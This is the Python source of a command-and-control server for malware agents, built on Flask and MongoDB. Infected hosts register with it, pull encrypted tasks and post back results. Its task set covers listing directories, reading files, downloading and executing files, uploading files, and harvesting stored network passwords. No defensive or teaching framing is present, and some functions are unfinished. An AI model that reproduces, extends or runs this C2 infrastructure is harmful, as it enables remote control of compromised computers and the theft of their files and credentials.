# Manager Imports
from FSManager import FSManager
from DBManager import DBManager

# Other Imports
from CLI import *
from Agent import Agent
from Encryption import encrypt_bstr
import logging
import flask
from flask import request
import sys


# (localhost:27017, C2Data)
class C2Server:
    def __init__(self, db_addr="mongodb://127.0.0.1:27017", root_dir="./C2"):
        # File System
        self.FS_Manager = FSManager(root_dir, encrypt_data=True)

        # task system
        self.payloadTypes = {"dir": 0x01, "cat": 0x02, "change-time": 0x03, "download-file": 0x04, 
        "execute-file": 0x05, "get-net-password": 0x06,
        "get-exe-dir": 0x07, "get-net-names": 0x08, "get-all-net-passwords": 0x9, "upload-file": 0xa}

        self.file_payloads = {0x01, 0x02, 0x04, 0x05, 0xa}

        # Database system
        self.DB_Manager = DBManager(db_addr)

        # Flask Web Server
        self.C2_Server = flask.Flask(__name__)
        
        # MISC
        self.printData = False
        self.logData = False
        self.logErr = False

        # register an agent
        @self.C2_Server.route("/reg", methods=["POST"])
        def regAgent(): # add error checking
            Content_Type = request.content_type
            if(Content_Type == "application/x-www-form-urlencoded"):
                comp_name = request.form["comp"]
                new_agent = Agent(flask.request.remote_addr, comp_name)

                self.FS_Manager.fs_add_agent(new_agent.agent_name)
                self.DB_Manager.db_add_agent(new_agent)

                p_success("New Agent registered from " + flask.request.remote_addr)
                return(new_agent.agent_name, 200)
            else:
                return ("", 404)         

        # Send an agent payload
        @self.C2_Server.route("/payloads/<agentName>", methods=["GET"]) # add error checking
        def sendPayload(agentName):
            try:
                return flask.send_file(self.FS_Manager.fs_get_agent_task(agentName), mimetype="application/octet-stream")
            except:
                if(self.logErr):
                    p_warn("Request from possible agent ( %s )" % request.remote_addr)
                    return ("", 404)                 

        # receive results from the agent
        @self.C2_Server.route("/payloads/<agentName>/results", methods=["POST"])
        def getResults(agentName):
            try:
                pType, task_args = self.FS_Manager.fs_completed_task(agentName)
                self.parse_response(pType, task_args, flask.request.data, agentName)
                return ("", 200)
            except:
                if(self.logErr):
                    p_warn("Request from possible agent ( %s )" % request.remote_addr)
                    return ("", 404)       
        
        # Send file to agent
        @self.C2_Server.route("/<agentName>/getfile", methods=["GET"])
        def getFile(agentName):
            uFile = self.FS_Manager.fs_get_file_upload(agentName)
            if uFile != None:
                return flask.send_file(uFile, mimetype="application/octet-stream")
            else:
                return ("", 404)

    # start server
    def start_server(self, args):
        cli = sys.modules['flask.cli']
        cli.show_server_banner = lambda *x: None
        verbosity = args.verbosity_level
        if verbosity == "0" or verbosity == "1":
            p_success("Starting server, CTRL-C to quit")
            log = logging.getLogger('werkzeug')
            log.setLevel(logging.ERROR)
        if verbosity == "2" or verbosity == "1":
            self.printData = True
        if verbosity == "2":
            self.logErr = True
        if args.log_results == "True":
            self.logData = True
        self.C2_Server.run()
    
    # parse the results received from an agent
    def parse_response(self, pType, task_args, data, agentName):
        pType = ord(pType)
        if pType == self.payloadTypes["download-file"]:
            fileName = task_args[1].split("\\")[-1] 
            self.FS_Manager.fs_write_download(data, fileName, agentName)
        else:
            if self.printData:
                if(self.FS_Manager.encrypt_data):
                    decrypted_data = encrypt_bstr(agentName[6:12], data)
                    print(decrypted_data.decode("utf-8"))
                else:
                    print(data.decode("utf-8"))
            if self.logData:
                self.FS_Manager.fs_write_log(data.decode("utf-8"), agentName)
            
    # genertic task assignment function
    def generic_task(self, args):
        for agentObj in self.DB_Manager.db_get_agent_objects():
                    if agentObj["toggled"]:
                        agent = agentObj["name"]
                        gen_args = list(vars(args).values())[1:-1]
                        if(args.command == "upload-file"):
                            self.FS_Manager.fs_write_generic_task(agent, self.payloadTypes[args.command], [args.remotepath])
                            self.FS_Manager.fs_file_upload(args.filepath, agent)
                        else:
                            self.FS_Manager.fs_write_generic_task(agent, self.payloadTypes[args.command], gen_args)
    
    def c2_delete_agent(self, args):
        agent_name = args.agent_name
        self.FS_Manager.fs_delete_agent(agent_name)
        self.DB_Manager.db_del_agent(agent_name)
    
    def c2_delete_all_agents(self, args):
        p_warn("wiped all agents from the file and database system")
        for agent_name in self.DB_Manager.db_get_agent_list():
            del_agent = Agent("", "")
            del_agent.agent_name = agent_name
            self.c2_delete_agent(del_agent)
    
    def delete_agents(self, args):
        agent_names = list(vars(args).values())[1:-1]
        print(agent_names)
